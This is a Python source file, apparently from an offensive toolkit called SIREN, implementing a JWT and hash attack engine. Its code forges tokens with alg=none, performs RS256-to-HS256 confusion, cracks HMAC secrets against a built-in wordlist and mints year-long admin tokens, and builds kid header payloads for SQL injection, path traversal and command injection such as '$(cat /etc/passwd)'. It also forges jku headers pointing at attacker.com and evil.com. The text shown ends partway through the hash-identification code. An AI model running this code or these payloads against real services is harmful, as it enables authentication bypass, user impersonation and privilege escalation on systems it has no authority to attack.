"""
SIREN — Cryptographic Analysis & Attack Engine
================================================
Shannon Intelligence Recon & Exploitation Nexus

Full-spectrum cryptographic attack capabilities:
  - JWT token forgery, algorithm confusion, key extraction
  - Hash identification, dictionary attacks, rainbow tables
  - Cipher suite analysis, weak algorithm detection
  - TLS/SSL vulnerability scanning (BEAST, POODLE, Heartbleed signatures)
  - Certificate chain validation and exploitation
  - Encryption oracle attacks (padding oracle, CBC bit-flipping)
  - Key derivation weakness detection
  - HMAC timing attacks
  - Cryptographic randomness analysis

Pure Python — zero external crypto dependencies for portability.
Uses stdlib hashlib, hmac, base64, struct, ssl, socket.

(c) 2024-2026 SIREN / SIREN Project
Classification: OMEGA-ULTRABLACK
"""

from __future__ import annotations

import asyncio
import base64
import binascii
import hashlib
import hmac
import json
import logging
import math
import os
import re
import socket
import ssl
import string
import struct
import time
import urllib.parse
from abc import ABC, abstractmethod
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import (
    Any,
    AsyncGenerator,
    Callable,
    Dict,
    Generator,
    List,
    Optional,
    Set,
    Tuple,
    Union,
)

logger = logging.getLogger("siren.crypto")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

COMMON_JWT_SECRETS: List[str] = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "jwt_secret",
    "changeme",
    "test",
    "default",
    "supersecret",
    "mysecret",
    "s3cr3t",
    "jwt",
    "token",
    "access",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "login",
    "abc123",
    "passw0rd",
    "shadow",
    "sunshine",
    "trustno1",
    "iloveyou",
    "batman",
    "football",
    "charlie",
    "donald",
    "password1",
    "password123",
    "1234567890",
    "hunter2",
    "harley",
    "jordan",
    "thomas",
    "robert",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access14",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "xxxxxx",
    "bailey",
    "andrew",
    "tiger",
    "lauren",
    "andrea",
    "node",
    "blink182",
    "spring",
    "snoopy",
    "MY_SECRET_KEY",
    "my-secret-key",
    "your-256-bit-secret",
    "ssh-secret",
    "hmac-secret",
    "api-key",
    "API_KEY",
    "HS256_SECRET",
    "JWT_SECRET_KEY",
    "TOKEN_SECRET",
    "AUTH_SECRET",
    "APP_SECRET",
    "SECRET_KEY",
    "SIGNING_KEY",
    "ENCRYPTION_KEY",
    "PRIVATE_KEY",
    "PUBLIC_KEY",
    "the-cake-is-a-lie",
    "i-am-a-teapot",
    "all-your-base",
    "correct-horse-battery-staple",
    "Tr0ub4dor&3",
]

HASH_PATTERNS: Dict[str, re.Pattern] = {
    "md5": re.compile(r"^[a-fA-F0-9]{32}$"),
    "sha1": re.compile(r"^[a-fA-F0-9]{40}$"),
    "sha224": re.compile(r"^[a-fA-F0-9]{56}$"),
    "sha256": re.compile(r"^[a-fA-F0-9]{64}$"),
    "sha384": re.compile(r"^[a-fA-F0-9]{96}$"),
    "sha512": re.compile(r"^[a-fA-F0-9]{128}$"),
    "ntlm": re.compile(r"^[a-fA-F0-9]{32}$"),
    "mysql323": re.compile(r"^[a-fA-F0-9]{16}$"),
    "mysql41": re.compile(r"^\*[a-fA-F0-9]{40}$"),
    "bcrypt": re.compile(r"^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$"),
    "scrypt": re.compile(r"^\$s0\$"),
    "argon2": re.compile(r"^\$argon2(i|d|id)\$"),
    "pbkdf2_sha256": re.compile(r"^pbkdf2_sha256\$"),
    "pbkdf2_sha512": re.compile(r"^pbkdf2_sha512\$"),
    "django_pbkdf2": re.compile(r"^pbkdf2_sha256\$\d+\$"),
    "sha256_crypt": re.compile(r"^\$5\$"),
    "sha512_crypt": re.compile(r"^\$6\$"),
    "md5_crypt": re.compile(r"^\$1\$"),
    "des_crypt": re.compile(r"^[./A-Za-z0-9]{13}$"),
    "apr1": re.compile(r"^\$apr1\$"),
    "phpass": re.compile(r"^\$P\$|^\$H\$"),
    "crc32": re.compile(r"^[a-fA-F0-9]{8}$"),
    "adler32": re.compile(r"^[a-fA-F0-9]{8}$"),
}

WEAK_CIPHERS: Set[str] = {
    "RC4",
    "DES",
    "3DES",
    "RC2",
    "IDEA",
    "SEED",
    "NULL",
    "EXPORT",
    "anon",
    "MD5",
    "SHA1",
    "DES-CBC3-SHA",
    "RC4-SHA",
    "RC4-MD5",
    "EXP-RC4-MD5",
    "EXP-DES-CBC-SHA",
    "DES-CBC-SHA",
    "EDH-RSA-DES-CBC-SHA",
    "EDH-DSS-DES-CBC-SHA",
    "ADH-DES-CBC-SHA",
    "ADH-RC4-MD5",
    "EXP-EDH-RSA-DES-CBC-SHA",
    "EXP-EDH-DSS-DES-CBC-SHA",
    "EXP-ADH-DES-CBC-SHA",
    "EXP-ADH-RC4-MD5",
    "EXP-RC2-CBC-MD5",
    "NULL-SHA",
    "NULL-MD5",
    "NULL-SHA256",
}

TLS_VERSIONS: Dict[str, int] = {
    "SSLv2": 0x0200,
    "SSLv3": 0x0300,
    "TLSv1.0": 0x0301,
    "TLSv1.1": 0x0302,
    "TLSv1.2": 0x0303,
    "TLSv1.3": 0x0304,
}

DEPRECATED_TLS: Set[str] = {"SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"}


# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------


class CryptoAttackType(Enum):
    """Types of cryptographic attacks."""

    JWT_NONE_ALG = auto()
    JWT_ALG_CONFUSION = auto()
    JWT_WEAK_SECRET = auto()
    JWT_KID_INJECTION = auto()
    JWT_JKU_SPOOFING = auto()
    JWT_X5U_SPOOFING = auto()
    JWT_EXPIRED_ACCEPT = auto()
    HASH_CRACK_DICT = auto()
    HASH_CRACK_BRUTE = auto()
    HASH_CRACK_RAINBOW = auto()
    HASH_LENGTH_EXTENSION = auto()
    PADDING_ORACLE = auto()
    CBC_BIT_FLIP = auto()
    ECB_DETECTION = auto()
    WEAK_CIPHER = auto()
    WEAK_KEY_SIZE = auto()
    CERT_EXPIRED = auto()
    CERT_SELF_SIGNED = auto()
    CERT_WRONG_HOST = auto()
    CERT_WEAK_SIG = auto()
    TLS_DOWNGRADE = auto()
    TIMING_ATTACK = auto()
    WEAK_RANDOM = auto()
    KEY_REUSE = auto()
    HMAC_BYPASS = auto()


class CryptoSeverity(Enum):
    """Severity of cryptographic findings."""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class HashAlgorithm(Enum):
    """Supported hash algorithms."""

    MD5 = "md5"
    SHA1 = "sha1"
    SHA224 = "sha224"
    SHA256 = "sha256"
    SHA384 = "sha384"
    SHA512 = "sha512"
    NTLM = "ntlm"
    BCRYPT = "bcrypt"
    SCRYPT = "scrypt"
    ARGON2 = "argon2"
    PBKDF2 = "pbkdf2"


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------


@dataclass
class CryptoFinding:
    """A cryptographic vulnerability finding."""

    attack_type: CryptoAttackType
    severity: CryptoSeverity
    title: str
    description: str
    evidence: str = ""
    impact: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    cwe_id: str = ""
    target: str = ""
    timestamp: float = field(default_factory=time.time)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type.name,
            "severity": self.severity.value,
            "title": self.title,
            "description": self.description,
            "evidence": self.evidence,
            "impact": self.impact,
            "remediation": self.remediation,
            "cvss_score": self.cvss_score,
            "cwe_id": self.cwe_id,
            "target": self.target,
            "timestamp": self.timestamp,
            "metadata": self.metadata,
        }


@dataclass
class JWTToken:
    """Parsed JWT token."""

    raw: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: bytes
    header_b64: str
    payload_b64: str
    signature_b64: str
    algorithm: str = ""
    is_expired: bool = False
    issuer: str = ""
    subject: str = ""
    audience: str = ""
    expiration: Optional[float] = None
    issued_at: Optional[float] = None

    @property
    def signing_input(self) -> str:
        return f"{self.header_b64}.{self.payload_b64}"


@dataclass
class HashResult:
    """Result of a hash cracking attempt."""

    original_hash: str
    algorithm: str
    cracked: bool
    plaintext: str = ""
    method: str = ""
    attempts: int = 0
    duration_ms: float = 0.0
    confidence: float = 0.0


@dataclass
class CipherInfo:
    """Information about a cipher suite."""

    name: str
    protocol: str
    key_exchange: str = ""
    authentication: str = ""
    encryption: str = ""
    mac: str = ""
    key_size: int = 0
    is_weak: bool = False
    is_deprecated: bool = False
    notes: List[str] = field(default_factory=list)


@dataclass
class CertificateInfo:
    """Parsed certificate information."""

    subject: Dict[str, str] = field(default_factory=dict)
    issuer: Dict[str, str] = field(default_factory=dict)
    serial_number: str = ""
    version: int = 0
    not_before: str = ""
    not_after: str = ""
    signature_algorithm: str = ""
    key_size: int = 0
    key_type: str = ""
    san: List[str] = field(default_factory=list)
    is_expired: bool = False
    is_self_signed: bool = False
    is_wildcard: bool = False
    days_until_expiry: int = 0
    fingerprint_sha256: str = ""
    fingerprint_sha1: str = ""
    chain_length: int = 0
    ocsp_urls: List[str] = field(default_factory=list)
    crl_urls: List[str] = field(default_factory=list)


@dataclass
class TLSInfo:
    """TLS connection information."""

    host: str
    port: int = 443
    supported_versions: List[str] = field(default_factory=list)
    cipher_suites: List[CipherInfo] = field(default_factory=list)
    certificate: Optional[CertificateInfo] = None
    supports_compression: bool = False
    supports_renegotiation: bool = False
    supports_heartbeat: bool = False
    has_hsts: bool = False
    hsts_max_age: int = 0
    vulnerabilities: List[str] = field(default_factory=list)


@dataclass
class CryptoConfig:
    """Configuration for the crypto engine."""

    jwt_secret_wordlist: List[str] = field(
        default_factory=lambda: list(COMMON_JWT_SECRETS)
    )
    hash_wordlist_path: Optional[str] = None
    hash_max_brute_length: int = 6
    hash_brute_charset: str = string.ascii_lowercase + string.digits
    tls_timeout: float = 10.0
    tls_check_versions: List[str] = field(
        default_factory=lambda: ["SSLv3", "TLSv1.0", "TLSv1.1", "TLSv1.2", "TLSv1.3"]
    )
    padding_oracle_threads: int = 16
    timing_samples: int = 50
    timing_threshold_ms: float = 5.0
    max_hash_crack_time: float = 300.0
    enable_rainbow: bool = True
    rainbow_table_path: Optional[str] = None
    verbose: bool = False


# =========================================================================
#  JWT ATTACK ENGINE
# =========================================================================


class JWTAttackEngine:
    """
    Comprehensive JWT (JSON Web Token) attack engine.

    Attacks implemented:
    - Algorithm None bypass (CVE-2015-9235)
    - Algorithm Confusion RS256->HS256 (CVE-2016-10555)
    - Weak secret brute-force / dictionary
    - KID parameter injection (SQL injection, path traversal)
    - JKU/X5U header spoofing
    - Expired token acceptance testing
    - Claim manipulation
    - Signature stripping
    - Token replay
    """

    def __init__(self, config: CryptoConfig):
        self.config = config
        self.findings: List[CryptoFinding] = []
        self._stats = {
            "tokens_analyzed": 0,
            "attacks_tried": 0,
            "vulns_found": 0,
        }

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        """Base64url encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    @staticmethod
    def _b64url_decode(data: str) -> bytes:
        """Base64url decode with automatic padding."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    def parse_token(self, token: str) -> Optional[JWTToken]:
        """Parse a JWT token into its components."""
        try:
            parts = token.strip().split(".")
            if len(parts) not in (2, 3):
                logger.warning(
                    "Invalid JWT format: expected 2-3 parts, got %d", len(parts)
                )
                return None

            header_b64 = parts[0]
            payload_b64 = parts[1]
            signature_b64 = parts[2] if len(parts) == 3 else ""

            header = json.loads(self._b64url_decode(header_b64))
            payload = json.loads(self._b64url_decode(payload_b64))
            signature = self._b64url_decode(signature_b64) if signature_b64 else b""

            algorithm = header.get("alg", "unknown")
            expiration = payload.get("exp")
            is_expired = False
            if expiration:
                try:
                    is_expired = float(expiration) < time.time()
                except (ValueError, TypeError):
                    pass

            jwt_token = JWTToken(
                raw=token,
                header=header,
                payload=payload,
                signature=signature,
                header_b64=header_b64,
                payload_b64=payload_b64,
                signature_b64=signature_b64,
                algorithm=algorithm,
                is_expired=is_expired,
                issuer=str(payload.get("iss", "")),
                subject=str(payload.get("sub", "")),
                audience=str(payload.get("aud", "")),
                expiration=float(expiration) if expiration else None,
                issued_at=float(payload.get("iat", 0)) if payload.get("iat") else None,
            )
            self._stats["tokens_analyzed"] += 1
            return jwt_token
        except Exception as exc:
            logger.error("Failed to parse JWT: %s", exc)
            return None

    def forge_token(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        secret: Union[str, bytes] = "",
        algorithm: str = "none",
    ) -> str:
        """Forge a JWT token with arbitrary header/payload."""
        header_b64 = self._b64url_encode(
            json.dumps(header, separators=(",", ":")).encode()
        )
        payload_b64 = self._b64url_encode(
            json.dumps(payload, separators=(",", ":")).encode()
        )
        signing_input = f"{header_b64}.{payload_b64}"

        if algorithm.lower() == "none":
            return f"{signing_input}."

        if isinstance(secret, str):
            secret = secret.encode("utf-8")

        if algorithm.upper() in ("HS256", "HS384", "HS512"):
            hash_alg = {
                "HS256": hashlib.sha256,
                "HS384": hashlib.sha384,
                "HS512": hashlib.sha512,
            }[algorithm.upper()]
            sig = hmac.new(secret, signing_input.encode("ascii"), hash_alg).digest()
            sig_b64 = self._b64url_encode(sig)
            return f"{signing_input}.{sig_b64}"

        # For unsupported algorithms, return without valid signature
        return f"{signing_input}.{self._b64url_encode(b'forged')}"

    def attack_none_algorithm(self, token: JWTToken) -> Optional[CryptoFinding]:
        """
        CVE-2015-9235: Algorithm None Attack.
        Forge token with alg=none and empty signature.
        """
        self._stats["attacks_tried"] += 1

        none_variants = ["none", "None", "NONE", "nOnE", "noNe", "nONE", "NonE"]
        forged_tokens = []

        for variant in none_variants:
            new_header = dict(token.header)
            new_header["alg"] = variant
            forged = self.forge_token(new_header, token.payload, algorithm="none")
            forged_tokens.append({"alg_variant": variant, "token": forged})

        # Also try with completely stripped signature
        new_header = dict(token.header)
        new_header["alg"] = "none"
        header_b64 = self._b64url_encode(
            json.dumps(new_header, separators=(",", ":")).encode()
        )
        payload_b64 = self._b64url_encode(
            json.dumps(token.payload, separators=(",", ":")).encode()
        )
        stripped = f"{header_b64}.{payload_b64}."
        forged_tokens.append({"alg_variant": "none_stripped", "token": stripped})

        # Try without trailing dot
        no_dot = f"{header_b64}.{payload_b64}"
        forged_tokens.append({"alg_variant": "none_no_dot", "token": no_dot})

        finding = CryptoFinding(
            attack_type=CryptoAttackType.JWT_NONE_ALG,
            severity=CryptoSeverity.CRITICAL,
            title="JWT Algorithm None Bypass (CVE-2015-9235)",
            description=(
                "The JWT library may accept tokens with algorithm set to 'none', "
                "effectively disabling signature verification. This allows an attacker "
                "to forge arbitrary tokens without knowing the signing key."
            ),
            evidence=json.dumps(forged_tokens[:3], indent=2),
            impact=(
                "Complete authentication bypass. Attacker can impersonate any user, "
                "escalate privileges, and access any protected resource."
            ),
            remediation=(
                "1. Explicitly whitelist allowed algorithms on the server side\n"
                "2. Never accept 'none' as a valid algorithm\n"
                "3. Use a JWT library that rejects none by default\n"
                "4. Validate algorithm before verifying signature"
            ),
            cvss_score=9.8,
            cwe_id="CWE-327",
            metadata={
                "forged_tokens": forged_tokens,
                "variants_tried": len(forged_tokens),
            },
        )
        self.findings.append(finding)
        self._stats["vulns_found"] += 1
        return finding

    def attack_algorithm_confusion(
        self, token: JWTToken, public_key: Optional[str] = None
    ) -> Optional[CryptoFinding]:
        """
        CVE-2016-10555: Algorithm Confusion Attack.
        Switch from RS256 to HS256, using the public key as HMAC secret.
        """
        self._stats["attacks_tried"] += 1

        if token.algorithm not in (
            "RS256",
            "RS384",
            "RS512",
            "ES256",
            "ES384",
            "ES512",
            "PS256",
        ):
            logger.info(
                "Token uses %s, not an asymmetric algorithm — skipping confusion attack",
                token.algorithm,
            )
            return None

        confusion_map = {
            "RS256": "HS256",
            "RS384": "HS384",
            "RS512": "HS512",
            "ES256": "HS256",
            "ES384": "HS384",
            "ES512": "HS512",
            "PS256": "HS256",
        }

        target_alg = confusion_map.get(token.algorithm, "HS256")
        forged_tokens = []

        if public_key:
            # Sign with public key as HMAC secret
            new_header = dict(token.header)
            new_header["alg"] = target_alg

            key_variants = [
                public_key.encode("utf-8"),
                public_key.strip().encode("utf-8"),
                public_key.replace("\r\n", "\n").encode("utf-8"),
                public_key.replace("\n", "\r\n").encode("utf-8"),
            ]

            for i, key in enumerate(key_variants):
                forged = self.forge_token(
                    new_header, token.payload, secret=key, algorithm=target_alg
                )
                forged_tokens.append({"key_variant": i, "token": forged})

        # Generate template for manual testing
        new_header = dict(token.header)
        new_header["alg"] = target_alg
        template = self.forge_token(
            new_header, token.payload, secret="PUBLIC_KEY_HERE", algorithm=target_alg
        )
        forged_tokens.append({"key_variant": "template", "token": template})

        finding = CryptoFinding(
            attack_type=CryptoAttackType.JWT_ALG_CONFUSION,
            severity=CryptoSeverity.CRITICAL,
            title=f"JWT Algorithm Confusion: {token.algorithm} → {target_alg} (CVE-2016-10555)",
            description=(
                f"The server may accept tokens signed with {target_alg} (symmetric) "
                f"when it expects {token.algorithm} (asymmetric). By using the public key "
                f"as the HMAC secret, an attacker can forge valid tokens."
            ),
            evidence=json.dumps(forged_tokens[:2], indent=2),
            impact=(
                "Complete authentication bypass if the public key is known. "
                "Attacker can forge tokens for any user with any claims."
            ),
            remediation=(
                "1. Use separate code paths for symmetric and asymmetric algorithms\n"
                "2. Explicitly specify the expected algorithm during verification\n"
                "3. Never let the token's header dictate the verification algorithm\n"
                "4. Use a JWT library that enforces algorithm whitelisting"
            ),
            cvss_score=9.8,
            cwe_id="CWE-327",
            metadata={
                "original_algorithm": token.algorithm,
                "target_algorithm": target_alg,
                "forged_tokens": forged_tokens,
            },
        )
        self.findings.append(finding)
        self._stats["vulns_found"] += 1
        return finding

    def attack_weak_secret(self, token: JWTToken) -> Optional[CryptoFinding]:
        """
        Brute-force the JWT HMAC secret using a dictionary.
        """
        self._stats["attacks_tried"] += 1

        if token.algorithm not in ("HS256", "HS384", "HS512"):
            logger.info(
                "Token uses %s, not HMAC — skipping weak secret attack", token.algorithm
            )
            return None

        hash_alg_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_alg = hash_alg_map[token.algorithm]
        signing_input = token.signing_input.encode("ascii")
        target_sig = token.signature

        start_time = time.time()
        attempts = 0
        found_secret = None

        for secret in self.config.jwt_secret_wordlist:
            attempts += 1
            computed = hmac.new(
                secret.encode("utf-8"), signing_input, hash_alg
            ).digest()
            if hmac.compare_digest(computed, target_sig):
                found_secret = secret
                break

        # Also try common patterns based on token claims
        if not found_secret:
            extra_secrets = []
            if token.issuer:
                extra_secrets.extend(
                    [
                        token.issuer,
                        f"{token.issuer}_secret",
                        f"{token.issuer}-secret",
                        f"secret_{token.issuer}",
                    ]
                )
            if token.subject:
                extra_secrets.extend([token.subject, f"{token.subject}_key"])

            for secret in extra_secrets:
                attempts += 1
                computed = hmac.new(
                    secret.encode("utf-8"), signing_input, hash_alg
                ).digest()
                if hmac.compare_digest(computed, target_sig):
                    found_secret = secret
                    break

        duration = (time.time() - start_time) * 1000

        if found_secret:
            # Forge a new admin token
            admin_payload = dict(token.payload)
            admin_payload["sub"] = "admin"
            admin_payload["role"] = "admin"
            admin_payload["admin"] = True
            admin_payload["exp"] = int(time.time()) + 86400 * 365
            admin_payload["iat"] = int(time.time())
            forged_admin = self.forge_token(
                token.header,
                admin_payload,
                secret=found_secret,
                algorithm=token.algorithm,
            )

            finding = CryptoFinding(
                attack_type=CryptoAttackType.JWT_WEAK_SECRET,
                severity=CryptoSeverity.CRITICAL,
                title=f"JWT Weak HMAC Secret Discovered ({token.algorithm})",
                description=(
                    f"The JWT signing secret was cracked via dictionary attack. "
                    f"Secret found: '{found_secret}' after {attempts} attempts "
                    f"in {duration:.1f}ms."
                ),
                evidence=(
                    f"Cracked secret: {found_secret}\n"
                    f"Algorithm: {token.algorithm}\n"
                    f"Forged admin token: {forged_admin[:80]}..."
                ),
                impact=(
                    "Complete authentication bypass. Attacker can forge tokens for "
                    "any user with arbitrary claims (admin, elevated roles, etc)."
                ),
                remediation=(
                    "1. Use a cryptographically strong random secret (256+ bits)\n"
                    "2. Generate secrets with: openssl rand -hex 64\n"
                    "3. Rotate secrets regularly\n"
                    "4. Consider switching to asymmetric algorithms (RS256, ES256)\n"
                    "5. Implement token binding to prevent replay"
                ),
                cvss_score=9.8,
                cwe_id="CWE-521",
                metadata={
                    "secret": found_secret,
                    "attempts": attempts,
                    "duration_ms": duration,
                    "forged_admin_token": forged_admin,
                },
            )
            self.findings.append(finding)
            self._stats["vulns_found"] += 1
            return finding
        return None

    def attack_kid_injection(self, token: JWTToken) -> Optional[CryptoFinding]:
        """
        KID (Key ID) parameter injection — SQL injection and path traversal
        through the 'kid' header parameter.
        """
        self._stats["attacks_tried"] += 1

        kid_payloads = [
            # SQL injection via kid
            {"kid": "' UNION SELECT 'secret' -- ", "type": "sqli", "secret": "secret"},
            {"kid": "' OR '1'='1", "type": "sqli", "secret": ""},
            {"kid": "1; SELECT 'key' FROM secrets--", "type": "sqli", "secret": "key"},
            {"kid": "' UNION SELECT '' -- ", "type": "sqli_empty", "secret": ""},
            # Path traversal via kid
            {"kid": "../../dev/null", "type": "path_traversal", "secret": ""},
            {"kid": "/dev/null", "type": "path_traversal", "secret": ""},
            {"kid": "../../../etc/hostname", "type": "path_traversal", "secret": ""},
            {"kid": "../../proc/self/environ", "type": "path_traversal", "secret": ""},
            # Command injection via kid
            {
                "kid": "key.pem | cat /etc/passwd",
                "type": "command_injection",
                "secret": "",
            },
            {"kid": "$(cat /etc/passwd)", "type": "command_injection", "secret": ""},
            {"kid": "`cat /etc/passwd`", "type": "command_injection", "secret": ""},
        ]

        forged_tokens = []
        for payload_info in kid_payloads:
            new_header = dict(token.header)
            new_header["kid"] = payload_info["kid"]

            forged = self.forge_token(
                new_header,
                token.payload,
                secret=payload_info["secret"],
                algorithm="HS256",
            )
            forged_tokens.append(
                {
                    "type": payload_info["type"],
                    "kid": payload_info["kid"],
                    "token": forged,
                }
            )

        finding = CryptoFinding(
            attack_type=CryptoAttackType.JWT_KID_INJECTION,
            severity=CryptoSeverity.HIGH,
            title="JWT KID Parameter Injection",
            description=(
                "The JWT 'kid' (Key ID) header parameter may be vulnerable to injection "
                "attacks. If the server uses 'kid' to look up keys from a database or "
                "file system, SQL injection or path traversal could be exploited."
            ),
            evidence=json.dumps(forged_tokens[:3], indent=2),
            impact=(
                "Authentication bypass via controlled key material. "
                "SQL injection could lead to data extraction. "
                "Path traversal could expose sensitive files."
            ),
            remediation=(
                "1. Sanitize and validate the 'kid' parameter\n"
                "2. Use a whitelist of allowed key IDs\n"
                "3. Don't use 'kid' for database queries without parameterization\n"
                "4. Don't use 'kid' for file system paths"
            ),
            cvss_score=8.6,
            cwe_id="CWE-89",
            metadata={"forged_tokens": forged_tokens},
        )
        self.findings.append(finding)
        self._stats["vulns_found"] += 1
        return finding

    def attack_jku_spoofing(self, token: JWTToken) -> Optional[CryptoFinding]:
        """JKU (JWK Set URL) header spoofing attack."""
        self._stats["attacks_tried"] += 1

        spoofed_urls = [
            "https://attacker.com/.well-known/jwks.json",
            "https://evil.com/jwks.json",
            "http://localhost:8080/jwks.json",
            "http://127.0.0.1/jwks.json",
            "https://attacker.com@legitimate-domain.com/jwks.json",
            "https://legitimate-domain.com.attacker.com/jwks.json",
        ]

        forged_tokens = []
        for url in spoofed_urls:
            new_header = dict(token.header)
            new_header["jku"] = url
            forged = self.forge_token(new_header, token.payload, algorithm="none")
            forged_tokens.append({"jku": url, "token": forged})

        finding = CryptoFinding(
            attack_type=CryptoAttackType.JWT_JKU_SPOOFING,
            severity=CryptoSeverity.HIGH,
            title="JWT JKU Header Spoofing",
            description=(
                "The JWT 'jku' header specifies a URL for the JSON Web Key Set. "
                "If the server fetches keys from this URL without proper validation, "
                "an attacker can point it to a malicious server with a crafted key set."
            ),
            evidence=json.dumps(forged_tokens[:3], indent=2),
            impact=(
                "Authentication bypass by providing attacker-controlled signing keys. "
                "SSRF via server-side URL fetching."
            ),
            remediation=(
                "1. Whitelist allowed JKU URLs\n"
                "2. Don't trust the jku header from untrusted tokens\n"
                "3. Pin the JWK Set URL in server configuration\n"
                "4. Validate URL scheme, host, and path"
            ),
            cvss_score=8.2,
            cwe_id="CWE-346",
            metadata={"forged_tokens": forged_tokens},
        )
        self.findings.append(finding)
        self._stats["vulns_found"] += 1
        return finding

    def attack_expired_token(self, token: JWTToken) -> Optional[CryptoFinding]:
        """Test if expired tokens are still accepted."""
        self._stats["attacks_tried"] += 1

        if not token.is_expired:
            return None

        finding = CryptoFinding(
            attack_type=CryptoAttackType.JWT_EXPIRED_ACCEPT,
            severity=CryptoSeverity.MEDIUM,
            title="JWT Expired Token May Be Accepted",
            description=(
                f"The JWT token is expired (exp: {token.expiration}). "
                "If the server doesn't validate the 'exp' claim, expired tokens "
                "could be replayed indefinitely."
            ),
            evidence=f"Token expiration: {token.expiration}\nCurrent time: {time.time()}",
            impact="Session replay attacks using stolen expired tokens.",
            remediation=(
                "1. Always validate the 'exp' claim\n"
                "2. Implement token revocation / blacklisting\n"
                "3. Use short-lived tokens with refresh token rotation\n"
                "4. Add clock skew tolerance (max 30 seconds)"
            ),
            cvss_score=5.4,
            cwe_id="CWE-613",
        )
        self.findings.append(finding)
        self._stats["vulns_found"] += 1
        return finding

    def manipulate_claims(self, token: JWTToken) -> List[Dict[str, Any]]:
        """Generate tokens with manipulated claims for testing."""
        manipulations = []

        # Privilege escalation variants
        priv_escalation_payloads = [
            {"role": "admin"},
            {"role": "administrator"},
            {"role": "root"},
            {"admin": True},
            {"is_admin": True},
            {"isAdmin": True},
            {"privilege": "admin"},
            {"access_level": "full"},
            {"permissions": ["*"]},
            {"scope": "admin read write delete"},
            {"groups": ["admins", "superusers"]},
            {"user_type": "admin"},
        ]

        for priv_payload in priv_escalation_payloads:
            new_payload = dict(token.payload)
            new_payload.update(priv_payload)
            # Re-set expiration far in the future
            new_payload["exp"] = int(time.time()) + 86400 * 365
            new_payload["iat"] = int(time.time())

            forged = self.forge_token(token.header, new_payload, algorithm="none")
            manipulations.append(
                {
                    "type": "privilege_escalation",
                    "modified_claims": priv_payload,
                    "token": forged,
                }
            )

        # User impersonation
        target_users = ["admin", "root", "administrator", "system", "service", "api"]
        for user in target_users:
            new_payload = dict(token.payload)
            new_payload["sub"] = user
            new_payload["username"] = user
            new_payload["user_id"] = 1
            new_payload["email"] = f"{user}@target.com"
            new_payload["exp"] = int(time.time()) + 86400 * 365

            forged = self.forge_token(token.header, new_payload, algorithm="none")
            manipulations.append(
                {
                    "type": "user_impersonation",
                    "target_user": user,
                    "token": forged,
                }
            )

        return manipulations

    async def full_attack(
        self, token_str: str, public_key: Optional[str] = None
    ) -> List[CryptoFinding]:
        """Run all JWT attacks against a token."""
        token = self.parse_token(token_str)
        if not token:
            return []

        logger.info(
            "JWT Analysis: alg=%s, iss=%s, sub=%s, expired=%s",
            token.algorithm,
            token.issuer,
            token.subject,
            token.is_expired,
        )

        # Run all attacks
        self.attack_none_algorithm(token)
        self.attack_algorithm_confusion(token, public_key)
        self.attack_weak_secret(token)

        if "kid" in token.header:
            self.attack_kid_injection(token)

        if "jku" in token.header or token.algorithm.startswith("RS"):
            self.attack_jku_spoofing(token)

        self.attack_expired_token(token)
        self.manipulate_claims(token)

        return self.findings

    @property
    def stats(self) -> Dict[str, int]:
        return dict(self._stats)


# =========================================================================
#  HASH IDENTIFICATION & CRACKING ENGINE
# =========================================================================


class HashEngine:
    """
    Hash identification, dictionary attacks, brute-force, and rainbow tables.

    Features:
    - Automatic hash type identification (30+ formats)
    - Dictionary attack with rules (append, prepend, capitalize, leet)
    - Brute-force with configurable charset and length
    - In-memory rainbow table generation and lookup
    - Hash length extension attack detection
    - Salted hash handling
    - Performance-optimized with batch computation
    """

    def __init__(self, config: CryptoConfig):
        self.config = config
        self.findings: List[CryptoFinding] = []
        self._rainbow_tables: Dict[str, Dict[str, str]] = {}
        self._stats = {
            "hashes_analyzed": 0,
            "hashes_cracked": 0,
            "total_attempts": 0,
        }

    def identify_hash(self, hash_str: str) -> List[str]:
        """Identify possible hash algorithms from a hash string."""
        hash_str = hash_str.strip()
        candidates = []

        for algo_name, pattern in HASH_PATTERNS.items():
            if pattern.match(hash_str):
                candidates.append(algo_name)

        # Disambiguate by length and format
        if len(candidates) > 1:
            # MD5 and NTLM are both 32 hex chars
            if "md5" in candidates and "ntlm" in candidates:
                # If uppercase-heavy, more likely NTLM
                upper_ratio = sum(1 for c in hash_str if c.isupper()) / len(hash_str)
                if upper_ratio > 0.5:
                    candidates = ["ntlm", "md5"]
                else:
                    candidates = ["md5", "ntlm"]

            # CRC32 and Adler32 are both 8 hex chars
            if "crc32" in candidates and "adler32" in candidates:
                candidates = ["crc32", "adler32"]

        if not candidates:
            # Try to guess by length
            length_map = {
                8: ["crc32"],
                16: ["mysql323", "half_md5"],
                32: ["md5", "ntlm"],
                40: ["sha1", "mysql41"],
                56: ["sha224"],
                64: ["sha256"],
                96: ["sha384"],
